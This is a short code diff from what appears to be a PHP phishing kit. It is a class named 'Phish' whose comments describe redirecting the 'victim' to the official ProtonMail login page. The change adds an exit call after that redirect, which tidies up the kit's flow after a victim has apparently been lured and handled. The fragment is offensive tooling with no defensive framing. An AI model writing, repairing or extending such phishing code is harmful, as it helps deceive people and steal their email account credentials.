@@ -117,6 +117,7 @@ class Phish
 
           // redirect victim to official protonmail login
           self::urlredirect($protonmail_link . '/login');
+          exit; // EXIT SCRIPT
 
         // when folder does exists
         } else {
